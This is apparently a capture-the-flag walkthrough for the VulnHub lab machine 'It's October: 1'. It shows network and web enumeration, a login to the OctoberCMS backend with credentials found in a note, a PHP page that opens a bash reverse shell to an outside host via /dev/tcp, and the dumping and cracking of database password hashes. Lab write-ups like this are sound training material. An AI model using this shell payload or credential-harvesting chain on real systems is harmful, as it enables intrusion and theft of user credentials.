# It's October: 1

- **Machine:** It's October: 1
- **Download:** https://www.vulnhub.com/entry/its-october-1,460/

![](783-1.png)

---

## Setup

- Import the `.ova` file into VirtualBox.
- Click **Finish**.
- Start the virtual machine.

---

# Network Scanning

## Find the Target IP Address

```bash
nmap -sn 192.168.2.0/24
```

![](783-2.png)

---

## Full Port Scan

Run a comprehensive Nmap scan to identify all open ports, services, operating system information, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.179
```

![](783-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.179
```

```bash
nmap -sC -sV -A 192.168.2.179
```

---

## HTTP Enumeration

Run the `http-enum` NSE script to discover hidden web resources.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.179
```

![](783-4.png)

---

# Web Enumeration

Visit the following endpoints.

- http://192.168.2.179/
- http://192.168.2.179:8080/

Inspect the source code on **port 8080**.

![](783-5.png)

---

## Discover Credentials

Visit the following file.

- http://192.168.2.179:8080/mynote.txt

![](783-6.png)

Recovered credentials:

```text
Username : admin
Password : adminadmin2
```

---

## Directory Enumeration

Brute-force directories.

```bash
gobuster dir -u http://192.168.2.179 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip
```

![](783-7.png)

Discovered endpoint:

- http://192.168.2.179/backend/backend/auth/signin

![](783-8.png)

Login to the backend.

- http://192.168.2.179/backend/backend

![](783-9.png)

---

# Reverse Shell

Navigate to:

**CMS → Add New Page**

![](783-10.png)

Insert the following payload inside the page code.

```php
function onStart() {
    shell_exec("bash -c 'bash -i >& /dev/tcp/192.168.2.218/443 0>&1'");
}
```

In the **Markup** section, add:

```text
test
```

Save the page.

---

## Start a Listener

```bash
nc -lvnp 443
```

Trigger the page by visiting:

```text
http://192.168.2.179/test
```

A reverse shell is received.

![](783-12.png)

---

## Stabilize the Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```

---

# Database Credentials Discovery

List the files.

```bash
ls -lh
```

Navigate to the configuration directory.

```bash
cd config
```

The `database.php` file is present.

![](783-13.png)

Read the configuration file.

```bash
cat database.php
```

The database username and password are disclosed.

![](783-14.png)

---

# MySQL Access

Login to MySQL.

```bash
mysql -u root -proot
```

![](783-15.png)

Enumerate the database.

```sql
SHOW DATABASES;
```

```sql
USE octoberdb;
```

```sql
SHOW TABLES;
```

Retrieve backend user credentials.

```sql
SELECT login, password FROM backend_users;
```

![](783-16.png)

![](783-17.png)

Password hashes are obtained.

---

## Crack the Password Hash

Save the hash.

```bash
nano hash.txt
```

![](783-18.png)

Crack the hash using John the Ripper.

```bash
john --wordlist=/opt/rockyou.txt hash.txt
```

---

# Key Learning

- Always inspect alternate HTTP ports.
- Source code may reveal sensitive files and credentials.
- Backend CMS panels can often be abused for code execution.
- Configuration files frequently expose database credentials.
- Accessing the database directly can reveal application users and password hashes.
- Password hashes should always be identified and tested for offline cracking.

---

# Summary

The assessment began with web enumeration, leading to the discovery of a note containing valid administrator credentials. These credentials provided access to the OctoberCMS backend, where a malicious CMS page was created to obtain a reverse shell. After gaining shell access, the database configuration file exposed MySQL credentials. Accessing the database allowed enumeration of backend user accounts and extraction of password hashes for offline cracking, demonstrating a complete chain from information disclosure to remote code execution and credential harvesting.